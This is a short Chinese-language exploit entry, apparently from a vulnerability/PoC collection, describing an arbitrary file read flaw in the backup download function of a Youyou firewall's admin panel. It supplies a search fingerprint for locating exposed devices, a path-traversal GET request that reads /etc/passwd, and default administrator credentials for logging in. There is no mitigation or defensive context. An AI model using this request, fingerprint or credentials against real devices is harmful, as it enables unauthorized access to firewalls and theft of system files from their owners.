# 佑友FHQbackup后台任意文件读取漏洞

佑友FHQbackup后台 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="佑友-佑友防火墙"`
- **请求**：`GET /index.php?c=backup&a=download&file=../../../../etc/passwd HTTP/1.1`

**Payload**
```
默认账号密码登录后台
admin/hicomadmin
Host:
Cookie: your-cookie
Sec-Fetch-User: ?1
Priority: u=4
```